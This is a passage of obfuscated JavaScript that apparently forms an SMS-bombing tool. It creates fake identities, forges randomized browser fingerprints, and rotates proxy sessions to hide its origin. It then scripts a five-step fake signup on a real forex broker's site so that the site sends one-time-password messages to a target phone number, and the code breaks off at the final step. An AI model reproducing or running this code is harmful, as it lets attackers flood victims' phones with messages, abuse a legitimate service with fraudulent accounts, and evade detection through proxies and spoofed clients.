      return v99.code = v98.country, v99.name = v98.name, v99;
    }
  }
  const v95 = {};
  return v95.code = 'US', v95.name = "Unknown (default: US)", v95;
}
function generateRandomEmail() {
  const v100 = ["gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "protonmail.com", "icloud.com", "mail.com", "aol.com", "zoho.com", "gmx.com"],
    v101 = ["john", "david", "michael", "chris", "james", "daniel", "mark", "steven", "robert", "william", "thomas", "andrew", "ryan", "kevin", "brian", "eric", "adam", "jason", "alex", "sam"],
    v102 = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "wilson", "moore", "taylor", "anderson", "thomas", "jackson", "white", "harris", "martin", "clark", "lewis", "hall"],
    v103 = v101[Math.floor(Math.random() * v101.length)],
    v104 = v102[Math.floor(Math.random() * v102.length)],
    v105 = Math.floor(Math.random() * 9999) + 1,
    v106 = ['.', '_', ''],
    v107 = v106[Math.floor(Math.random() * v106.length)];
  return '' + v103 + v107 + v104 + v105 + '@' + v100[Math.floor(Math.random() * v100.length)];
}
function generateRandomPassword() {
  const v108 = "abcdefghijklmnopqrstuvwxyz",
    v109 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    v110 = "0123456789",
    v111 = "!@#$%&";
  let v112 = '';
  v112 += v109[Math.floor(Math.random() * v109.length)];
  v112 += v108[Math.floor(Math.random() * v108.length)], v112 += v110[Math.floor(Math.random() * v110.length)], v112 += v111[Math.floor(Math.random() * v111.length)];
  const v113 = v108 + v109 + v110 + v111;
  for (let v114 = 0; v114 < 8; v114++) v112 += v113[Math.floor(Math.random() * v113.length)];
  return v112.split('').sort(() => Math.random() - 0.5).join('');
}
function generateRandomName() {
  const v115 = ["John", "David", "Michael", "Chris", "James", "Daniel", "Matthew", "Andrew", "Joshua", "Robert", "William", "Richard", "Thomas", "Mark", "Steven"],
    v116 = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White"],
    v117 = v115[Math.floor(Math.random() * v115.length)],
    v118 = v116[Math.floor(Math.random() * v116.length)],
    v119 = {};
  return v119.first = v117, v119.last = v118, v119.full = v117 + '\x20' + v118, v119;
}
function generateRandomDOB() {
  const v120 = Math.floor(Math.random() * 21) + 1980,
    v121 = Math.floor(Math.random() * 12) + 1;
  const v122 = Math.floor(Math.random() * 28) + 1;
  return {
    'day': v122,
    'month': v121,
    'year': v120,
    'full': v120 + '-' + String(v121).padStart(2, '0') + '-' + String(v122).padStart(2, '0')
  };
}
function generateRandomNickname() {
  const v123 = ["swift", "golden", "silver", "bold", "prime", "elite", "rapid", "smart", "alpha", "mega", "ultra", "pro", "global", "local", "royal"],
    v124 = ["trader", "market", "bull", "eagle", "wolf", "shark", "titan", "phoenix", "falcon", "lion", "viper", "hawk"],
    v125 = ['fx', "pro", "trade", "cap", "hub", "net", "one"];
  return v123[Math.floor(Math.random() * v123.length)] + '\x20' + v124[Math.floor(Math.random() * v124.length)] + '\x20' + v125[Math.floor(Math.random() * v125.length)];
}
function generateRandomAddress(v126) {
  const v127 = ["Main Street", "Park Avenue", "Oak Drive", "Elm Street", "Cedar Lane", "Maple Road", "Pine Street", "Lake View Drive", "Hill Road", "River Road", "Victoria Road", "Church Street", "Station Road", "High Street", "King Street"],
    v128 = {};
  v128.cities = ["Harare", "Bulawayo", "Chitungwiza", "Mutare", "Gweru", "Masvingo", "Kwekwe", "Kadoma"], v128.states = ["Harare Province", "Bulawayo Province", "Manicaland", "Mashonaland East", "Mashonaland West", "Masvingo Province", "Matabeleland North"], v128.postalCodes = ["00263", "00100", "00200", "00300", "00400", "00500"];
  const v129 = {};
  v129.cities = ["Dhaka", "Chittagong", "Rajshahi", "Khulna", "Sylhet", "Rangpur", "Comilla", "Gazipur"], v129.states = ["Dhaka Division", "Chittagong Division", "Rajshahi Division", "Khulna Division", "Sylhet Division"], v129.postalCodes = ["1000", "1100", "1200", "1205", "1207", "1210", "1215", "1216"];
  const v130 = {};
  v130.cities = ["Mumbai", "Delhi", "Bangalore", "Hyderabad", "Chennai", "Kolkata", "Pune", "Ahmedabad", "Jaipur"], v130.states = ["Maharashtra", "Delhi", "Karnataka", "Telangana", "Tamil Nadu", "West Bengal", "Gujarat", "Rajasthan"], v130.postalCodes = ["400001", "110001", "560001", "500001", "600001", "700001", "380001", "302001"];
  const v131 = {};
  v131.cities = ["Karachi", "Lahore", "Islamabad", "Rawalpindi", "Faisalabad", "Multan", "Peshawar"];
  v131.states = ["Sindh", "Punjab", "Islamabad Capital", "Khyber Pakhtunkhwa", "Balochistan"], v131.postalCodes = ["74000", "54000", "44000", "46000", "38000", "60000", "25000"];
  const v132 = {};
  v132.cities = ["Manila", "Quezon City", "Cebu City", "Davao City", "Makati", "Pasig", "Taguig"], v132.states = ["Metro Manila", "Central Visayas", "Davao Region", "Central Luzon", "Western Visayas"], v132.postalCodes = ["1000", "1100", "6000", "8000", "1200", "1600", "1630"];
  const v133 = {};
  v133.cities = ["Lagos", "Abuja", "Kano", "Ibadan", "Port Harcourt", "Benin City", "Kaduna"], v133.states = ["Lagos State", "FCT Abuja", "Kano State", "Oyo State", "Rivers State", "Edo State"], v133.postalCodes = ["100001", "900001", "700001", "200001", "500001", "300001"];
  const v134 = {};
  v134.cities = ["Nairobi", "Mombasa", "Kisumu", "Nakuru", "Eldoret", "Thika", "Malindi"], v134.states = ["Nairobi County", "Mombasa County", "Kisumu County", "Nakuru County", "Uasin Gishu County"], v134.postalCodes = ["00100", "80100", "40100", "20100", "30100", "01000"];
  const v135 = {};
  v135.cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "San Francisco", "Seattle", "Miami", "Denver", "Boston"], v135.states = ["New York", "California", "Illinois", "Texas", "Arizona", "Washington", "Florida", "Colorado", "Massachusetts"], v135.postalCodes = ["10001", "90001", "60601", "77001", "85001", "94101", "98101", "33101", "80201", "02101"];
  const v136 = {};
  v136.cities = ["London", "Manchester", "Birmingham", "Leeds", "Glasgow", "Liverpool", "Edinburgh", "Bristol"], v136.states = ["Greater London", "Greater Manchester", "West Midlands", "West Yorkshire", "Scotland", "Merseyside"], v136.postalCodes = ["SW1A 1AA", "M1 1AE", "B1 1BB", "LS1 1BA", "G1 1AA", "L1 1JQ", "EH1 1YZ", "BS1 1AA"];
  const v137 = {};
  v137.cities = ["Sydney", "Melbourne", "Brisbane", "Perth", "Adelaide", "Gold Coast", "Canberra", "Hobart"], v137.states = ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "ACT", "Tasmania"], v137.postalCodes = ["2000", "3000", "4000", "6000", "5000", "4217", "2600", "7000"];
  const v138 = {};
  v138.cities = ["Johannesburg", "Cape Town", "Durban", "Pretoria", "Port Elizabeth", "Bloemfontein"], v138.states = ["Gauteng", "Western Cape", "KwaZulu-Natal", "Limpopo", "Eastern Cape", "Free State"], v138.postalCodes = ["2000", "8000", "4000", "0001", "6000", "9300"];
  const v139 = {};
  v139.cities = ["Dar es Salaam", "Dodoma", "Mwanza", "Arusha", "Zanzibar City", "Mbeya"], v139.states = ["Dar es Salaam Region", "Dodoma Region", "Arusha Region", "Mwanza Region"], v139.postalCodes = ["11101", "41101", "33101", "23101", "71101", "53101"];
  const v140 = {};
  v140.cities = ["Kampala", "Entebbe", "Jinja", "Gulu", "Mbarara", "Fort Portal"], v140.states = ["Central Region", "Eastern Region", "Northern Region", "Western Region"], v140.postalCodes = ["00256", "00100", "00200", "00300", "00400"];
  const v141 = {};
  v141.cities = ["Accra", "Kumasi", "Tamale", "Sekondi-Takoradi", "Cape Coast", "Tema"];
  v141.states = ["Greater Accra", "Ashanti Region", "Northern Region", "Western Region", "Central Region"], v141.postalCodes = ["00233", "GA100", "AK100", "NT100", "WR100"];
  const v142 = {};
  v142.ZW = v128, v142.BD = v129, v142.IN = v130, v142.PK = v131, v142.PH = v132, v142.NG = v133, v142.KE = v134, v142.US = v135, v142.GB = v136, v142.AU = v137, v142.ZA = v138, v142.TZ = v139, v142.UG = v140, v142.GH = v141;
  const v143 = v142,
    v144 = {};
  v144.cities = ["Metro City", "Central Town", "Eastside", "Westville", "Northpoint", "Southfield"], v144.states = ["Central Province", "Eastern Province", "Western Province", "Northern Province"], v144.postalCodes = ["10000", "20000", "30000", "40000", "50000"];
  const v145 = v144,
    v146 = v143[v126] || v145,
    fn3 = v147 => v147[Math.floor(Math.random() * v147.length)];
  return {
    'street': Math.floor(Math.random() * 999) + 1 + '\x20' + fn3(v127),
    'city': fn3(v146.cities),
    'state': fn3(v146.states),
    'postalCode': fn3(v146.postalCodes)
  };
}
function getRandomClient(v148 = "random") {
  const v149 = {};
  v149.min = 0x1bbf, v149.max = 0x1c1f;
  const v150 = {};
  v150.min = 0x1bef, v150.max = 0x1c51;
  const v151 = {};
  v151.min = 0x1c24, v151.max = 0x1c83;
  const v152 = {};
  v152.min = 0x1c5b, v152.max = 0x1cb5;
  const v153 = {};
  v153.min = 0x1c8e, v153.max = 0x1ce7;
  const v154 = {};
  v154.min = 0x1cc1, v154.max = 0x1d19;
  const v155 = {};
  v155.min = 0x1cf4, v155.max = 0x1d4b;
  const v156 = {};
  v156.min = 0x1d27, v156.max = 0x1d7d;
  const v157 = {};
  v157.min = 0x1d5a, v157.max = 0x1daf;
  const v158 = {};
  v158.min = 0x1d8d, v158.max = 0x1de1;
  const v159 = {};
  v159.min = 0x1dc0, v159.max = 0x1e13;
  const v160 = {};
  v160.min = 0x1df3, v160.max = 0x1e45;
  const v161 = {};
  v161.min = 0x1e26, v161.max = 0x1e77;
  const v162 = {};
  v162.min = 0x1e59, v162.max = 0x1ea9;
  const v163 = {};
  v163["136"] = v149, v163["137"] = v150, v163["138"] = v151, v163["139"] = v152, v163["140"] = v153, v163["141"] = v154, v163["142"] = v155, v163["143"] = v156, v163["144"] = v157, v163["145"] = v158, v163["146"] = v159, v163["147"] = v160, v163["148"] = v161, v163["149"] = v162;
  const v164 = v163,
    v165 = Object.keys(v164).map(Number),
    v166 = v165.map((v188, v189) => Math.pow(v189 + 1, 2)),
    v167 = v166.reduce((v190, v191) => v190 + v191, 0);
  let v168 = Math.random() * v167,
    v169 = v165[v165.length - 1];
  for (let v192 = 0; v192 < v165.length; v192++) {
    v168 -= v166[v192];
    if (v168 <= 0) {
      v169 = v165[v192];
      break;
    }
  }
  const v170 = v164[v169],
    v171 = Math.floor(Math.random() * (v170.max - v170.min + 1)) + v170.min;
  const v172 = Math.floor(Math.random() * 200),
    v173 = {};
  v173["136"] = "\"Not=A_Brand\";v=\"99\"", v173["137"] = "\"Not/A)Brand\";v=\"8\"", v173["138"] = "\"Not)A;Brand\";v=\"99\"", v173["139"] = "\"Not;A=Brand\";v=\"8\"", v173["140"] = "\"Not=A?Brand\";v=\"8\"", v173["141"] = "\"Not?A_Brand\";v=\"99\"", v173["142"] = "\"Not_A Brand\";v=\"24\"", v173["143"] = "\"Not A(Brand\";v=\"8\"", v173["144"] = "\"Not(A;Brand\";v=\"99\"", v173["145"] = "\"Not;A)Brand\";v=\"24\"", v173["146"] = "\"Not)A=Brand\";v=\"8\"", v173["147"] = "\"Not=A_Brand\";v=\"99\"", v173["148"] = "\"Not/A)Brand\";v=\"8\"", v173["149"] = "\"Not)A;Brand\";v=\"24\"";
  const v174 = v173,
    v175 = v174[v169] || "\"Not A(Brand\";v=\"24\"",
    v176 = Math.random();
  let v177;
  if (v176 < 0.55) v177 = "win11";else {
    if (v176 < 0.8) v177 = "win10";else {
      if (v176 < 0.92) v177 = "mac";else v177 = "linux";
    }
  }
  const v178 = ["22621", "22631", "23403", "23419", "23424", "23435", "23440", "26100"],
    v179 = ["19041", "19042", "19043", "19044", "19045"],
    v180 = {};
  v180.ua = "10_15_7";
  v180.platform = "\"14.6.1\"", v180.silicon = false;
  const v181 = {};
  v181.ua = "10_15_7", v181.platform = "\"14.5.0\"", v181.silicon = false;
  const v182 = {};
  v182.ua = "10_15_7", v182.platform = "\"15.0.0\"", v182.silicon = true;
  const v183 = {};
  v183.ua = "10_15_7", v183.platform = "\"14.4.1\"", v183.silicon = false;
  const v184 = {};
  v184.ua = "10_15_7", v184.platform = "\"15.1.0\"", v184.silicon = true;
  const v185 = {};
  v185.ua = "10_15_7", v185.platform = "\"13.6.0\"", v185.silicon = false;
  const v186 = [v180, v181, v182, v183, v184, v185],
    fn4 = v193 => {
      {
        const v194 = v193[Math.floor(Math.random() * v193.length)];
        return '\x22' + (Math.floor(Math.random() * 6) + 10) + ".0." + v194 + '\x22';
      }
    };
  let v187 = v148;
  if (v187 === "random") {
    const v195 = Math.random();
    if (v195 < 0.7) v187 = "chrome";else {
      if (v195 < 0.88) v187 = "firefox";else v187 = "edge";
    }
  }
  if (v187 === "firefox") {
    const v196 = Math.floor(Math.random() * 19) + 120,
      v197 = Math.floor(Math.random() * 3);
    if (v177 === "mac") {
      const v198 = v186[Math.floor(Math.random() * v186.length)],
        v199 = {};
      return v199.name = "Mac Firefox", v199.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X " + v198.ua + "; rv:" + v196 + '.' + v197 + ") Gecko/20100101 Firefox/" + v196 + '.' + v197, v199.clientHints = {}, v199;
    } else {
      {
        const v200 = v177 === "win11" ? "10.0" : "10.0",
          v201 = {};
        return v201.name = "Windows Firefox", v201.userAgent = "Mozilla/5.0 (Windows NT " + v200 + "; Win64; x64; rv:" + v196 + '.' + v197 + ") Gecko/20100101 Firefox/" + v196 + '.' + v197, v201.clientHints = {}, v201;
      }
    }
  }
  if (v187 === "edge") {
    {
      const v202 = Math.floor(Math.random() * 200),
        v203 = fn4(v177 === "win11" ? v178 : v179),
        v204 = {};
      return v204.name = "Windows Edge", v204.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v169 + ".0." + v171 + '.' + v172 + " Safari/537.36 Edg/" + v169 + ".0." + v171 + '.' + v202, v204.clientHints = {}, v204.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v169 + "\", " + v175 + ", \"Microsoft Edge\";v=\"" + v169 + '\x22', v204.clientHints["sec-ch-ua-mobile"] = '?0', v204.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v204.clientHints["sec-ch-ua-platform-version"] = v203, v204.clientHints["sec-ch-ua-full-version-list"] = "\"Chromium\";v=\"" + v169 + ".0." + v171 + '.' + v172 + "\", " + v175 + ", \"Microsoft Edge\";v=\"" + v169 + ".0." + v171 + '.' + v202 + '\x22', v204;
    }
  }
  if (v177 === "mac") {
    {
      const v205 = v186[Math.floor(Math.random() * v186.length)],
        v206 = {};
      return v206.name = v205.silicon ? "Mac Chrome (ARM)" : "Mac Chrome (Intel)", v206.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X " + v205.ua + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v169 + ".0." + v171 + '.' + v172 + " Safari/537.36", v206.clientHints = {}, v206.clientHints["sec-ch-ua"] = "\"Google Chrome\";v=\"" + v169 + "\", \"Chromium\";v=\"" + v169 + "\", " + v175, v206.clientHints["sec-ch-ua-mobile"] = '?0', v206.clientHints["sec-ch-ua-platform"] = "\"macOS\"", v206.clientHints["sec-ch-ua-platform-version"] = v205.platform, v206.clientHints["sec-ch-ua-full-version-list"] = "\"Google Chrome\";v=\"" + v169 + ".0." + v171 + '.' + v172 + "\", \"Chromium\";v=\"" + v169 + ".0." + v171 + '.' + v172 + "\", " + v175, v206;
    }
  } else {
    if (v177 === "linux") return {
      'name': "Linux Chrome",
      'userAgent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v169 + ".0." + v171 + '.' + v172 + " Safari/537.36",
      'clientHints': {
        'sec-ch-ua': "\"Google Chrome\";v=\"" + v169 + "\", \"Chromium\";v=\"" + v169 + "\", " + v175,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': "\"Linux\"",
        'sec-ch-ua-platform-version': "\"6." + (Math.floor(Math.random() * 8) + 1) + '.' + Math.floor(Math.random() * 20) + '\x22',
        'sec-ch-ua-full-version-list': "\"Google Chrome\";v=\"" + v169 + ".0." + v171 + '.' + v172 + "\", \"Chromium\";v=\"" + v169 + ".0." + v171 + '.' + v172 + "\", " + v175
      }
    };else {
      const v207 = fn4(v177 === "win11" ? v178 : v179);
      return {
        'name': v177 === "win11" ? "Win11 Chrome" : "Win10 Chrome",
        'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v169 + ".0." + v171 + '.' + v172 + " Safari/537.36",
        'clientHints': {
          'sec-ch-ua': "\"Google Chrome\";v=\"" + v169 + "\", \"Chromium\";v=\"" + v169 + "\", " + v175,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': "\"Windows\"",
          'sec-ch-ua-platform-version': v207,
          'sec-ch-ua-full-version-list': "\"Google Chrome\";v=\"" + v169 + ".0." + v171 + '.' + v172 + "\", \"Chromium\";v=\"" + v169 + ".0." + v171 + '.' + v172 + "\", " + v175
        }
      };
    }
  }
}
function parseProxy(v208) {
  if (!v208) return null;
  if (typeof v208 === "object") return v208;
  v208 = v208.trim();
  if (!v208) return null;
  let v209, v210, v211, v212;
  if (v208.includes("://")) v208 = v208.split("://")[1];
  if (v208.includes('@')) {
    {
      const v214 = v208.split('@'),
        v215 = v214[0].split(':'),
        v216 = v214[1].split(':');
      v211 = v215[0], v212 = v215[1], v209 = v216[0], v210 = parseInt(v216[1]);
    }
  } else {
    {
      const v217 = v208.split(':');
      if (v217.length === 2) v209 = v217[0], v210 = parseInt(v217[1]);else {
        if (v217.length === 4) {
          {
            if (!isNaN(parseInt(v217[3])) && isNaN(parseInt(v217[1]))) {
              v211 = v217[0], v212 = v217[1], v209 = v217[2], v210 = parseInt(v217[3]);
            } else v209 = v217[0], v210 = parseInt(v217[1]), v211 = v217[2], v212 = v217[3];
          }
        } else {
          if (v217.length === 3) {
            v209 = v217[0], v210 = parseInt(v217[1]), v211 = v217[2];
          }
        }
      }
    }
  }
  if (!v209 || !v210) return null;
  const v213 = {};
  v213.type = "http", v213.host = v209, v213.port = v210;
  return v213.user = v211, v213.pass = v212, v213.original = v208, v213;
}
function rotateSessionId(v218) {
  if (!v218 || !v218.user) return v218;
  const v219 = {
      ...v218
    },
    v220 = v219;
  if (v220.user.includes("-ssid-")) {
    {
      const v221 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v220.user = v220.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v221);
    }
  } else {
    if (v220.user.includes("-session-")) {
      {
        const v222 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v220.user = v220.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v222);
      }
    } else {
      if (/_sid_/i.test(v220.user)) {
        const v223 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v220.user = v220.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v223);
      }
    }
  }
  return v220;
}
function createProxyAgent(v224) {
  if (!v224) return null;
  const v225 = typeof v224 === "string" ? parseProxy(v224) : v224;
  if (!v225) return null;
  let v226 = '';
  if (v225.type === "socks5" || v225.type === "socks4") {
    return v226 = "socks5://" + (v225.user ? encodeURIComponent(v225.user) + ':' + encodeURIComponent(v225.pass || '') + '@' : '') + v225.host + ':' + v225.port, new SocksProxyAgent(v226);
  } else return v226 = "http://" + (v225.user ? encodeURIComponent(v225.user) + ':' + encodeURIComponent(v225.pass || '') + '@' : '') + v225.host + ':' + v225.port, new HttpsProxyAgent(v226);
}
(function () {
  let v227;
  try {
    const v228 = Function('return (function() {}.constructor("return this")( ));');
    v227 = v228();
  } catch (v229) {
    v227 = window;
  }
  v227.setInterval(fn2, 4000);
})();
function sendRequest(v230, v231, v232, v233, v234 = null, v235 = 15000, v236 = {}) {
  return new Promise((v237, v238) => {
    const v239 = new URL(v230),
      v240 = {
        ...v232
      };
    let v241 = v240;
    !v241["Accept-Encoding"] && (v241["Accept-Encoding"] = "gzip, deflate, br");
    v233 && (v241["Content-Length"] = Buffer.byteLength(v233));
    const v242 = {
      'hostname': v239.hostname,
      'path': v239.pathname + v239.search,
      'method': v231,
      'headers': v241,
      'timeout': v235,
      'ciphers': "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
      'secureOptions': require("crypto").constants.SSL_OP_NO_SSLv3 | require("crypto").constants.SSL_OP_NO_TLSv1 | require("crypto").constants.SSL_OP_NO_TLSv1_1
    };
    let v243 = null;
    if (v234) {
      {
        v243 = typeof v234 === "object" ? v234 : parseProxy(v234);
        if (!v243 || isNaN(v243.port) || v243.port <= 0) return v238(new Error("FATAL: Invalid proxy. Aborting to prevent IP leak."));
        v242.agent = createProxyAgent(v243);
      }
    }
    const v244 = https.request(v242, v245 => {
      {
        const v246 = [];
        let v247 = 0;
        const v248 = v236.maxBytes || 0;
        let v249 = false;
        v245.on("data", v250 => {
          if (!v249) {
            v246.push(v250), v247 += v250.length, v248 > 0 && v247 >= v248 && (v249 = true);
          }
        }), v245.on("error", v251 => {
          if (v249) return fn5();
          v238(v251);
        });
        const fn5 = () => {
          {
            let v252 = Buffer.concat(v246);
            const v253 = v245.headers["content-encoding"];
            if (v253 === "gzip") {
              try {
                v252 = zlib.gunzipSync(v252);
              } catch (v255) {}
            } else {
              if (v253 === "deflate") try {
                v252 = zlib.inflateSync(v252);
              } catch (v256) {} else {
                if (v253 === 'br') {
                  try {
                    v252 = zlib.brotliDecompressSync(v252);
                  } catch (v257) {}
                }
              }
            }
            const v254 = v245.headers["set-cookie"] || [];
            v237({
              'status': v245.statusCode,
              'data': v252.toString("utf8"),
              'headers': v245.headers,
              'cookies': v254
            });
          }
        };
        v245.on("end", fn5);
      }
    });
    v244.on("error", v238), v244.on("timeout", () => {
      v244.destroy();
      v238(new Error("timeout"));
    });
    if (v233) v244.write(v233);
    v244.end();
  });
}
async function triggerOTP(v258, v259 = {}) {
  const {
    onStatus = () => {},
    proxy = null,
    timeout = 15000,
    workerId = 0,
    browserPref = "random"
  } = v259;
  const v260 = normalizePhoneNumber(v258),
    v261 = detectCountryFromPhone(v260),
    v262 = v261.code;
  try {
    {
      const v263 = getRandomClient(browserPref),
        v264 = generateRandomEmail(),
        v265 = generateRandomPassword(),
        v266 = generateRandomNickname(),
        v267 = generateRandomName(),
        v268 = generateRandomDOB(),
        v269 = generateRandomAddress(v262),
        v270 = {};
      v270.NEXT_LOCALE = "en-au";
      let v271 = v270;
      const fn6 = v298 => {
          if (!v298) return;
          v298.forEach(v299 => {
            {
              const v300 = v299.split(';')[0].split('=');
              if (v300.length >= 2) v271[v300[0].trim()] = v300.slice(1).join('=').trim();
            }
          });
        },
        fn7 = () => Object.entries(v271).map(([v301, v302]) => v301 + '=' + v302).join(';\x20'),
        fn8 = (v303, v304, v305) => ({
          'User-Agent': v263.userAgent,
          'Accept': "text/x-component",
          'Accept-Language': "en-US,en;q=0.9",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'Content-Type': "text/plain;charset=UTF-8",
          'Origin': "https://secure.titanfx.com",
          'Referer': v305,
          'next-action': v303,
          'next-router-state-tree': v304,
          'Sec-Fetch-Dest': "empty",
          'Sec-Fetch-Mode': "cors",
          'Sec-Fetch-Site': "same-origin",
          'Cookie': fn7(),
          ...v263.clientHints
        });
      onStatus("[1/5] Signup → " + v261.name + '\x20(' + v262 + ") | " + v264.substring(0, 15) + "...");
      const v272 = {};
      v272.email = v264, v272.password = v265, v272.country = v262;
      const v273 = {};
      v273.fileName = "SignupForm.tsx", v273.page = "sign-up page";
      const v274 = JSON.stringify([v272, v273]),
        v275 = fn8("7fc4f75e8afa1553b3a01588244ed27d9d785db1ad", "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(split)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22signup%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D", "https://secure.titanfx.com/register/step/signup"),
        v276 = {};
      v276.email = v264, v276.password = v265, v276.country = v262, debugLog(v260, "step1-req", v276);
      const v277 = {};
      v277.maxBytes = 0x800;
      const v278 = await sendRequest("https://secure.titanfx.com/register/step/signup", "POST", v275, v274, proxy, timeout, v277);
      fn6(v278.cookies), debugLog(v260, "step1-res", {
        'status': v278.status,
        'data': v278.data.substring(0, 500)
      });
      if (v278.status !== 200) throw new Error("Signup failed (HTTP " + v278.status + ')');
      if (v278.data.toLowerCase().includes("error") && v278.data.toLowerCase().includes("already")) {
        throw new Error("Email already registered");
      }
      onStatus("[2/5] Initializing account setup session...");
      const v279 = fn8("7f2be3ccd44c6ecfc9261c09a3ffdab61d3ec55d44", "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22account-setup%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D", "https://secure.titanfx.com/register/step/account-setup"),
        v280 = {};
      v280.maxBytes = 0x200;
      const v281 = await sendRequest("https://secure.titanfx.com/register/step/account-setup", "POST", v279, '[]', proxy, timeout, v280);
      fn6(v281.cookies);
      const v282 = {};
      v282.status = v281.status, v282.cookies = v281.cookies, debugLog(v260, "step2a-res", v282);
      !v271._fb_img && debugLog(v260, "warning", "_fb_img cookie not set after preflight");
      onStatus("[3/5] Submitting trading account details...");
      const v283 = {};
      v283.email = v264, v283.nickname = v266, v283.serverType = "mt4", v283.tradingAccountGroupType = "blade", v283.leverage = '50', v283.currency = "JPY";
      const v284 = JSON.stringify([v283]),
        v285 = fn8("7f9bc1e3222ec211a25834ceeca378199c4e723e6e", "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22account-setup%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D", "https://secure.titanfx.com/register/step/account-setup");
      debugLog(v260, "step2b-req", v284);
      const v286 = {};
      v286.maxBytes = 0x800;
      const v287 = await sendRequest("https://secure.titanfx.com/register/step/account-setup", "POST", v285, v284, proxy, timeout, v286);
      fn6(v287.cookies), debugLog(v260, "step2b-res", {
        'status': v287.status,
        'data': v287.data.substring(0, 500)
      });
      if (v287.status !== 200) throw new Error("Account setup failed (HTTP " + v287.status + ')');
      onStatus("[4/5] Initializing personal info form...");
      const v288 = fn8("7fdc1dc82e72899590833a184838e5fcf117cee68c", "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22personal-info%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D", "https://secure.titanfx.com/register/step/personal-info"),
        v289 = {};
      v289.maxBytes = 0x200;
      const v290 = await sendRequest("https://secure.titanfx.com/register/step/personal-info", "POST", v288, '[]', proxy, timeout, v289);
      fn6(v290.cookies);
      const v291 = {};
      v291.status = v290.status, debugLog(v260, "step3a-res", v291), onStatus("[5/5] Submitting phone number → Triggering OTP...");
      const v292 = {};
      v292.phone = v260, v292.language = 'en';
      const v293 = {};
